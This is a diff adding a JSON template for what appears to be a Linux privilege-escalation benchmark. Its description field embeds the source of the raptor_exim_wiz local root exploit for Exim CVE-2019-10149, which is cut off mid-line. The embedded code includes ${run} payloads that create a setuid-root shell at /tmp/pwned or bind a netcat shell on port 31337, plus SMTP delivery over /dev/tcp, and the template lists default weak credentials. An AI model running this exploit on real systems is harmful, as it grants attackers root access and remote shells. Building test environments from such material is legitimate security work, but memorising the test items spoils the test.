@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46996",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Exim 4.87 - 4.91 - Local Privilege Escalation (CVE-2019-10149)\n\nExploit source code (46996.sh):\n```\n#!/bin/bash\n\n#\n# raptor_exim_wiz - \"The Return of the WIZard\" LPE exploit\n# Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>\n#\n# A flaw was found in Exim versions 4.87 to 4.91 (inclusive).\n# Improper validation of recipient address in deliver_message()\n# function in /src/deliver.c may lead to remote command execution.\n# (CVE-2019-10149)\n#\n# This is a local privilege escalation exploit for \"The Return\n# of the WIZard\" vulnerability reported by the Qualys Security\n# Advisory team.\n#\n# Credits:\n# Qualys Security Advisory team (kudos for your amazing research!)\n# Dennis 'dhn' Herrmann (/dev/tcp technique)\n#\n# Usage (setuid method):\n# $ id\n# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]\n# $ ./raptor_exim_wiz -m setuid\n# Preparing setuid shell helper...\n# Delivering setuid payload...\n# [...]\n# Waiting 5 seconds...\n# -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned\n# # id\n# uid=0(root) gid=0(root) groups=0(root)\n#\n# Usage (netcat method):\n# $ id\n# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]\n# $ ./raptor_exim_wiz -m netcat\n# Delivering netcat payload...\n# Waiting 5 seconds...\n# localhost [127.0.0.1] 31337 (?) open\n# id\n# uid=0(root) gid=0(root) groups=0(root)\n#\n# Vulnerable platforms:\n# Exim 4.87 - 4.91\n#\n# Tested against:\n# Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]\n#\n\nMETHOD=\"setuid\" # default method\nPAYLOAD_SETUID='${run{\\x2fbin\\x2fsh\\t-c\\t\\x22chown\\troot\\t\\x2ftmp\\x2fpwned\\x3bchmod\\t4755\\t\\x2ftmp\\x2fpwned\\x22}}@localhost'\nPAYLOAD_NETCAT='${run{\\x2fbin\\x2fsh\\t-c\\t\\x22nc\\t-lp\\t31337\\t-e\\t\\x2fbin\\x2fsh\\x22}}@localhost'\n\n# usage instructions\nfunction usage()\n{\n\techo \"$0 [-m METHOD]\"\n\techo\n\techo \"-m setuid : use the setuid payload (default)\"\n\techo \"-m netcat : use the netcat payload\"\n\techo\n\texit 1\n}\n\n# payload delivery\nfunction exploit()\n{\n\t# connect to localhost:25\n\texec 3<>/dev/tcp/localhost/25\n\n\t# deliver the payload\n\tread -u 3 && echo $REPLY\n\techo \"helo localhost\" >&3\n\tread -u 3 && echo $REPLY\n\techo \"mail from:<>\" >&3\n\tread -u 3 && echo $REPLY\n\techo \"rcpt to:<$PAYLOAD>\" >&3\n\tread -u 3 && echo $REPLY\n\techo \"data\" >&3\n\tread -u 3 && echo $REPLY\n\tfor i in {1..31}\n\tdo\n\t\techo \"Received: $i\" >&3\n\tdone\n\techo \".\" >&3\n\tread -u 3 && echo $REPLY\n\techo \"quit\" >&3\n\tread -u 3 && echo $REPLY\n}\n\n# print banner\necho\necho 'raptor_exim_wiz - \"The Return of the WIZard\" LPE exploit'\necho 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'\necho\n\n# parse command line\nwhile [ ! -z \"$1\" ]; do\n\tcase $1 in\n\t\t-m) shift; METHOD=\"$1\"; shift;;\n\t\t* ) usage\n\t\t;;\n\tesac\ndone\nif [ -z $METHOD ]; then\n\tusage\nfi\n\n# setuid method\nif [ $METHOD = \"setuid\" ]; then\n\n\t# prepare a setuid shell helper to circumvent bash checks\n\techo \"Preparing setuid shell helper...\"\n\techo \"main(){setuid(0);setgid(0);system(\\\"/bin/sh\\\");}\" >/tmp/pwned.c\n\tgcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null\n\tif [ $? -ne 0 ]; then\n\t\techo \"Problems compiling setuid shell helper, check your gcc.\"\n\t\techo \"Falling back to the /bin/sh method.\"\n\t\tcp /bin/sh /tmp/pwne\n```",
+  "cve": "CVE-2019-10149",
+  "exploitdb_id": "46996",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46996",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
